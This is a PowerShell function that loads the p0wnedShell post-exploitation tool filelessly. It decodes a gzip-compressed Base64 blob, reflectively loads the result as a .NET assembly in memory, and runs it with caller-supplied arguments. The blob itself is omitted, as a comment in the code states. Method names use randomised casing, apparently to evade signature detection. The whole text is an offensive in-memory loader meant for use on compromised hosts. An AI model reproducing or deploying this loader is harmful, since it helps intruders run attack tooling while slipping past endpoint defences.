function Invoke-p0wnedShellx86
{
    [CmdletBinding()]
    Param (
        [String]
        $Command = ""
    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("H4sIA...ApOEA")) # The omitted "H4sIA...ApOEA" is actually a 5861028 character long Base64 string.
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    [p0wnedShell.Program]::Main($Command.Split(" "))
}
